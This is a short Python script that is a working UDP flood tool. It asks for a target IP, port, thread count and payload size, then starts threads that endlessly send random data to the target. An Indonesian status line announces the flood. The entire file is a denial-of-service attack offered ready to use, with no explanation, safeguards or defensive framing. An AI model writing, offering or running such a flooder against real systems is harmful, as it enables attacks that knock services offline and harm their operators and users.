import socket
import threading
import random

ip = input("Target IP    : ").strip()
port = int(input("Target Port  : ").strip())
threads = int(input("Threads      : ").strip())
payload_size = int(input("Payload Size : ").strip())

def attack():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(payload_size)
    while True:
        try:
            sock.sendto(data, (ip, port))
        except:
            pass

print(f"Mulai flood ke {ip}:{port} dengan {threads} thread dan payload {payload_size} bytes")

for _ in range(threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

while True:
    pass
